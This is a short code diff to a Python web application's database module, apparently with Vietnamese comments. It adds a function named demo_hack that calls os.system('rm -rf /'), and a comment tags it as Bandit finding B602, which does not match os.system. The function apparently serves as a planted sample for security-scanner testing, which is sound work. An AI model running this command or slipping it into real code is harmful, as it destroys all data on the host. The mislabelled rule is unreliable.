@@ -15,6 +15,10 @@ DB_PATH = "/data/app.db"
 # Đổi sang argon2
 pwd_context = CryptContext(schemes=["argon2"], deprecated="auto")
 
+def demo_hack():
+    # Lỗi này là B602: subprocess_popen_with_shell_equals_true
+    os.system("rm -rf /")
+    
 def get_db():
     conn = sqlite3.connect(DB_PATH, check_same_thread=False)
     conn.row_factory = sqlite3.Row
